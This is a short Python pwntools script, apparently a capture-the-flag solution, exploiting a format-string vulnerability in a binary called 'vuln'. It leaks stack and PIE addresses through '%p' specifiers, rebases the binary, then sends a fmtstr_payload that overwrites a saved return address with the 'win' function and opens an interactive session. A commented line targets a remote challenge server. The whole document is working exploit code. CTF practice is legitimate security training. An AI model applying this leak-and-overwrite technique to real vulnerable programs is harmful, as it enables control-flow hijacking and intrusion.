from pwn import *

context.log_level = logging.ERROR
elf = context.binary = ELF("vuln")


p = process()
# p = remote("74.207.229.59",20221)

p.recvuntil("t twice")
p.recvline()

p.sendline(f"%1$p|%3$p|%27$p")
STACK , LIBC, PIE = p.recvline().strip().split(b"|")
STACK = int(STACK[2:],16)
PIE = int(PIE[2:],16) - 0x11b3

print(hex(STACK))
print(hex(PIE))

elf.address = PIE

payload = fmtstr_payload(6,{STACK - 8: elf.sym["win"] + 1,},write_size="short")
print("payload len: ",hex(len(payload)))
p.sendline(payload)


p.interactive()